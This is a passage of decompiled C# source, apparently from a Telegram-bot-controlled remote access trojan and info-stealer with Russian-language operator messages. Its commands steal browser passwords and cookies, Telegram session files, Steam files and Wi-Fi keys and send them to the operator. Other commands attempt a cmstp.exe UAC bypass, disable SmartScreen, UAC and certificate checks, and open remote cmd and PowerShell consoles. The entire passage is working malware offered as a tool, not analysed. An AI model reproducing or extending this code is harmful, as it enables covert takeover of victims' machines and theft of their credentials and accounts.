					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /hidetaskbar", false, 0, null, false);
				};
				list23.Add(firstParser21);
				List<FirstParser> list24 = Commands.commands;
				FirstParser firstParser22 = new FirstParser();
				firstParser22.Command = "/showtaskbar";
				firstParser22.CountArgs = 0;
				firstParser22.Example = "/showtaskbar";
				firstParser22.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						Taskbar.Show();
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nСделано (>ω^)", false, 0, null, false);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser22.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /showtaskbar", false, 0, null, false);
				};
				list24.Add(firstParser22);
				List<FirstParser> list25 = Commands.state;
				FirstParser firstParser23 = new FirstParser();
				firstParser23.Command = "/commands";
				firstParser23.CountArgs = 0;
				firstParser23.Example = "/commands";
				firstParser23.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						ReplyKeyboardMarkup replyMarkup = new ReplyKeyboardMarkup
						{
							Keyboard = new string[][]
							{
								new string[]
								{
									"/help"
								},
								new string[]
								{
									"/getscreen"
								},
								new string[]
								{
									"/back"
								}
							}
						};
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nUsuall команды (✯◡✯)", false, 0, replyMarkup, false);
						Program.permstate = 2;
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser23.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /commands", false, 0, null, false);
				};
				list25.Add(firstParser23);
				List<FirstParser> list26 = Commands.state;
				FirstParser firstParser24 = new FirstParser();
				firstParser24.Command = "/stealer";
				firstParser24.CountArgs = 0;
				firstParser24.Example = "/stealer";
				firstParser24.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						ReplyKeyboardMarkup replyMarkup = new ReplyKeyboardMarkup
						{
							Keyboard = new string[][]
							{
								new string[]
								{
									"/help"
								},
								new string[]
								{
									"/getscreen"
								},
								new string[]
								{
									"/back"
								}
							}
						};
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nМодуль стиллера (✯◡✯)", false, 0, replyMarkup, false);
						Program.permstate = 4;
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser24.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /stealer", false, 0, null, false);
				};
				list26.Add(firstParser24);
				List<FirstParser> list27 = Commands.state;
				FirstParser firstParser25 = new FirstParser();
				firstParser25.Command = "/filemanager";
				firstParser25.CountArgs = 0;
				firstParser25.Example = "/filemanager";
				firstParser25.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						ReplyKeyboardMarkup replyMarkup = new ReplyKeyboardMarkup
						{
							Keyboard = new string[][]
							{
								new string[]
								{
									"/help"
								},
								new string[]
								{
									"drives"
								},
								new string[]
								{
									"/exit"
								}
							}
						};
						Program.mode = false;
						Program.permstate = 5;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nФайловый менеджер открыт (*¯︶¯*)", false, 0, replyMarkup, false);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser25.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /filemanager", false, 0, null, false);
				};
				list27.Add(firstParser25);
				List<FirstParser> list28 = Commands.commands;
				FirstParser firstParser26 = new FirstParser();
				firstParser26.Command = "/programms";
				firstParser26.CountArgs = 0;
				firstParser26.Example = "/programms";
				firstParser26.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\n",
							Func.Wait
						}), false, 0, null, false);
						string text = Func.Programms(true);
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\n",
							text
						}), false, 0, null, false);
					}
					catch
					{
						num = 1;
					}
					if (num == 1)
					{
						int num2 = 0;
						try
						{
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\n\"O my god, it's so big\" (⊙_⊙) \nЧто-то их много, попробую-ка я записать их в файлик...", false, 0, null, false);
							string path = Func.Programms(false);
							FileStream content = System.IO.File.OpenRead(path);
							await Commands.Bot.SendDocument((long)update.Message.From.Id, new FileToSend("Programms.txt", content), 0, null);
							System.IO.File.Delete(path);
							path = null;
						}
						catch (Exception obj)
						{
							num2 = 1;
						}
						object obj;
						if (num2 == 1)
						{
							Exception ex2 = (Exception)obj;
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
							{
								Environment.UserName,
								"/",
								Commands.pubIp,
								"\nВо мне произошла ошибка: ",
								ex2.Message
							}), false, 0, null, false);
						}
						obj = null;
					}
				};
				firstParser26.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /programms", false, 0, null, false);
				};
				list28.Add(firstParser26);
				List<FirstParser> list29 = Commands.commands;
				FirstParser firstParser27 = new FirstParser();
				firstParser27.Command = "/wallpaper";
				firstParser27.CountArgs = 0;
				firstParser27.Example = "/wallpaper";
				firstParser27.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						Program.wall = true;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nБратан, отправь-ка мне пичку", false, 0, null, false);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser27.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /wallpeper", false, 0, null, false);
				};
				list29.Add(firstParser27);
				List<FirstParser> list30 = Commands.commands;
				FirstParser firstParser28 = new FirstParser();
				firstParser28.Command = "/CmstpBypass";
				firstParser28.CountArgs = 0;
				firstParser28.Example = "/CmstpBypass";
				firstParser28.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nНачинаю эксплуатировать уязвимость в cmstp.exe (／。＼)\nУдачная реализация приведёт к получению прав администратора ヽ(・∀・)ﾉ", false, 0, null, false);
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nПоехали! (ﾉ_ヽ)", false, 0, null, false);
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nСпаси и сохрани! (／。＼)", false, 0, null, false);
						Func.admRun(Application.ExecutablePath);
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nЕсли ты это читаешь, затея не удалась и всё по старому\n               (╯°益°)╯彡┻━┻", false, 0, null, false);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser28.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /CmstpBypass", false, 0, null, false);
				};
				list30.Add(firstParser28);
				List<FirstParser> list31 = Commands.commands;
				FirstParser firstParser29 = new FirstParser();
				firstParser29.Command = "/OffCertChecking";
				firstParser29.CountArgs = 0;
				firstParser29.Example = "/OffCertChecking";
				firstParser29.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						if (Check.Acess)
						{
							RedirectAndBlock.StopChekingCertificate();
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nУже отключил, хозяин (⌒‿⌒)", false, 0, null, false);
						}
						else
						{
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nУ меня нет прав администратора (◣_◢)", false, 0, null, false);
						}
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser29.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /OffCertChecking", false, 0, null, false);
				};
				list31.Add(firstParser29);
				List<FirstParser> list32 = Commands.commands;
				FirstParser firstParser30 = new FirstParser();
				firstParser30.Command = "/OffAvNotification";
				firstParser30.CountArgs = 0;
				firstParser30.Example = "/OffAvNotification";
				firstParser30.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						if (Check.Acess)
						{
							DisableNotifications.SmartScreen(0);
							DisableNotifications.UAC(0);
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nУведомления Windows Smart Screen и UAC были отключены  <(￣︶￣)>", false, 0, null, false);
						}
						else
						{
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nУ меня нет прав администратора (◣_◢)", false, 0, null, false);
						}
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser30.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /OffAvNotification", false, 0, null, false);
				};
				list32.Add(firstParser30);
				List<FirstParser> list33 = Commands.state;
				FirstParser firstParser31 = new FirstParser();
				firstParser31.Command = "/cmd";
				firstParser31.CountArgs = 0;
				firstParser31.Example = "/cmd";
				firstParser31.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						Program.permstate = 7;
						Cmd.perm = true;
						Program.mode = false;
						ReplyKeyboardMarkup replyMarkup = new ReplyKeyboardMarkup
						{
							Keyboard = new string[][]
							{
								new string[]
								{
									"/help"
								},
								new string[]
								{
									"/back"
								}
							}
						};
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nУдаленная cmd консоль (＠＾－＾)", false, 0, replyMarkup, false);
						Cmd.UseShell();
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser31.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /cmd", false, 0, null, false);
				};
				list33.Add(firstParser31);
				List<FirstParser> list34 = Commands.state;
				FirstParser firstParser32 = new FirstParser();
				firstParser32.Command = "/powershell";
				firstParser32.CountArgs = 0;
				firstParser32.Example = "/powershell";
				firstParser32.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						Program.permstate = 8;
						PowerShell.perm = true;
						Program.mode = false;
						ReplyKeyboardMarkup replyMarkup = new ReplyKeyboardMarkup
						{
							Keyboard = new string[][]
							{
								new string[]
								{
									"/help"
								},
								new string[]
								{
									"/back"
								}
							}
						};
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nУдаленная powershell консоль ヽ(o^―^o)ﾉ", false, 0, replyMarkup, false);
						PowerShell.UseShell();
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser32.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /powershell", false, 0, null, false);
				};
				list34.Add(firstParser32);
				List<FirstParser> list35 = Commands.state;
				FirstParser firstParser33 = new FirstParser();
				firstParser33.Command = "/settings";
				firstParser33.CountArgs = 0;
				firstParser33.Example = "/settings";
				firstParser33.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						ReplyKeyboardMarkup replyMarkup = new ReplyKeyboardMarkup
						{
							Keyboard = new string[][]
							{
								new string[]
								{
									"/help"
								},
								new string[]
								{
									"/getscreen"
								},
								new string[]
								{
									"/back"
								}
							}
						};
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nНастройки Клиппера, Логера Буффера Обмена, Скрин Логера\nи создание конфига для меня (*≧ω≦*)", false, 0, replyMarkup, false);
						Program.permstate = 3;
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser33.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /settings", false, 0, null, false);
				};
				list35.Add(firstParser33);
				List<FirstParser> list36 = Commands.state;
				FirstParser firstParser34 = new FirstParser();
				firstParser34.Command = "/UseSimpleComplier";
				firstParser34.CountArgs = 0;
				firstParser34.Example = "/UseSimpleComplier";
				firstParser34.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						Program.mode = false;
						Program.permstate = 6;
						ReplyKeyboardMarkup replyMarkup = new ReplyKeyboardMarkup
						{
							Keyboard = new string[][]
							{
								new string[]
								{
									"/help"
								},
								new string[]
								{
									"!show"
								},
								new string[]
								{
									"/back"
								}
							}
						};
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nМодуль компилятора C# (*^^*)", false, 0, replyMarkup, false);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser34.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /UseSimpleComplier", false, 0, null, false);
				};
				list36.Add(firstParser34);
				List<FirstParser> list37 = Commands.state;
				FirstParser firstParser35 = new FirstParser();
				firstParser35.Command = "/AddFunction";
				firstParser35.CountArgs = 0;
				firstParser35.Example = "/AddFunction";
				firstParser35.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						Program.perm = 7;
						Program.stage = 1;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nОтправь мне код или файл с ним (´▽｀)", false, 0, null, false);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser35.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /AddFunction", false, 0, null, false);
				};
				list37.Add(firstParser35);
				List<FirstParser> list38 = Commands.grab;
				FirstParser firstParser36 = new FirstParser();
				firstParser36.Command = "/wifilist";
				firstParser36.CountArgs = 0;
				firstParser36.Example = "/wifilist";
				firstParser36.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						string arguments = "/c netsh wlan show profiles";
						ProcessStartInfo startInfo = new ProcessStartInfo("cmd", arguments)
						{
							UseShellExecute = false,
							CreateNoWindow = true,
							RedirectStandardOutput = true
						};
						Process process = new Process();
						process.StartInfo = startInfo;
						process.Start();
						string s = process.StandardOutput.ReadToEnd();
						byte[] bytes = Encoding.Default.GetBytes(s);
						byte[] bytes2 = Encoding.Convert(Encoding.GetEncoding(866), Encoding.GetEncoding(866), bytes);
						string text = Encoding.GetEncoding(866).GetString(bytes2).ToString();
						text = text.Replace("    Все профили пользователей     ", "ESSID");
						text = text.Replace("Профили пользователей", "WIFI сети к которым подключался компьютер");
						text = new string(text.Skip(154).ToArray<char>());
						process.WaitForExit();
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\n",
							text
						}), false, 0, null, false);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser36.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /wifilist", false, 0, null, false);
				};
				list38.Add(firstParser36);
				List<FirstParser> list39 = Commands.grab;
				FirstParser firstParser37 = new FirstParser();
				firstParser37.Command = "/wifipass";
				firstParser37.CountArgs = 1;
				firstParser37.Example = "/wifipass [ESSID]";
				firstParser37.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						string arguments = "/c netsh wlan show profiles name=" + model.Args.FirstOrDefault<string>() + " key=clear";
						ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd", arguments);
						processStartInfo.UseShellExecute = false;
						processStartInfo.CreateNoWindow = true;
						processStartInfo.RedirectStandardOutput = true;
						Process process = new Process();
						process.StartInfo = processStartInfo;
						process.Start();
						string s = process.StandardOutput.ReadToEnd();
						byte[] bytes = Encoding.Default.GetBytes(s);
						byte[] bytes2 = Encoding.Convert(Encoding.GetEncoding(866), Encoding.GetEncoding(866), bytes);
						string text = Encoding.GetEncoding(866).GetString(bytes2).ToString();
						text = text.Replace("Содержимое ключа", "Пароль");
						process.WaitForExit();
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\n",
							text
						}), false, 0, null, false);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser37.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /wifipass [ESSID]", false, 0, null, false);
				};
				list39.Add(firstParser37);
				List<FirstParser> list40 = Commands.grab;
				FirstParser firstParser38 = new FirstParser();
				firstParser38.Command = "/StealPasswords";
				firstParser38.CountArgs = 0;
				firstParser38.Example = "/StealPasswords";
				firstParser38.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						DirectoryForUs.Create(HomePath.User_Name, true);
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\n",
							Func.Wait
						}), false, 0, null, false);
						SearchPasswords.CheckList("Login Data");
						SearchPasswords.CopyLoginsInSafeDir("Logins", true);
						System.IO.File.AppendAllText(Commands.directory + "Log.txt", GrabPasswords.FindAllPassword());
						if (System.IO.File.Exists(Commands.directory + "Log.txt"))
						{
							using (FileStream stream = System.IO.File.OpenRead(Commands.directory + "Log.txt"))
							{
								await Commands.Bot.SendDocument((long)update.Message.From.Id, new FileToSend("Log.txt", stream), 0, null);
							}
							FileStream stream = null;
							System.IO.File.Delete(Commands.directory + "Log.txt");
							Directory.Delete(HomePath.User_Name + "\\Logins", true);
						}
						else
						{
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nПаролей нет", false, 0, null, false);
						}
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser38.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /StealPasswords", false, 0, null, false);
				};
				list40.Add(firstParser38);
				List<FirstParser> list41 = Commands.grab;
				FirstParser firstParser39 = new FirstParser();
				firstParser39.Command = "/StealCookies";
				firstParser39.CountArgs = 0;
				firstParser39.Example = "/StealCookies";
				firstParser39.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						DirectoryForUs.Create(HomePath.User_Name, true);
						SearchCookie.CheckList("Cookies");
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\n",
							Func.Wait
						}), false, 0, null, false);
						SearchCookie.CopyLoginsInSafeDir("Cookies", true);
						System.IO.File.AppendAllText(Commands.directory + "Cookies.txt", GrabCookie.FindAllCookie());
						if (System.IO.File.Exists(Commands.directory + "Cookies.txt"))
						{
							using (FileStream stream = System.IO.File.OpenRead(Commands.directory + "Cookies.txt"))
							{
								await Commands.Bot.SendDocument((long)update.Message.From.Id, new FileToSend("Cookies.txt", stream), 0, null);
							}
							FileStream stream = null;
							System.IO.File.Delete(Commands.directory + "Cookies.txt");
							Directory.Delete(HomePath.User_Name + "\\Cookies", true);
						}
						else
						{
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nВозникла ошибка(Куки нет)", false, 0, null, false);
						}
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser39.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /StealCookies", false, 0, null, false);
				};
				list41.Add(firstParser39);
				List<FirstParser> list42 = Commands.grab;
				FirstParser firstParser40 = new FirstParser();
				firstParser40.Command = "/GetTelegramSession";
				firstParser40.CountArgs = 0;
				firstParser40.Example = "/GetTelegramSession";
				firstParser40.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\n",
							Func.Wait
						}), false, 0, null, false);
						CopySession.GetFilesSession("*.*", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Telegram Desktop") + "\\tdata", Folders.hidenfolder + "\\Session", true).Wait();
						if (System.IO.File.Exists(Folders.hidenfolder + "\\Telegram.zip"))
						{
							FileStream content = System.IO.File.OpenRead(Folders.hidenfolder + "\\Telegram.zip");
							await Commands.Bot.SendDocument((long)update.Message.From.Id, new FileToSend("Telegram.zip", content), 0, null);
							System.IO.File.Delete(Folders.hidenfolder + "\\Telegram.zip");
							Directory.Delete(Folders.hidenfolder + "\\Session", true);
						}
						else
						{
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nЛога нет", false, 0, null, false);
							if (Directory.Exists(Folders.hidenfolder + "\\Session"))
							{
								System.IO.File.Delete(Folders.hidenfolder + "\\Telegram.zip");
								Directory.Delete(Folders.hidenfolder + "\\Session", true);
							}
						}
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser40.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /GetTelegramSession", false, 0, null, false);
				};
				list42.Add(firstParser40);
				List<FirstParser> list43 = Commands.grab;
				FirstParser firstParser41 = new FirstParser();
				firstParser41.Command = "/GetSteamFiles";
				firstParser41.CountArgs = 0;
				firstParser41.Example = "/GetSteamFiles";
				firstParser41.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\n",
							Func.Wait
						}), false, 0, null, false);
						GrabSteamFiles.Copy("*.", "*.vdf", "Steam", "config", "ID.txt").Wait();
						Archive.Zip(Folders.hidenfolder + "\\Steam.zip", Folders.hidenfolder + "\\Steam").Wait();
						if (System.IO.File.Exists(Folders.hidenfolder + "\\Steam.zip"))
						{
							FileStream content = System.IO.File.OpenRead(Folders.hidenfolder + "\\Steam.zip");
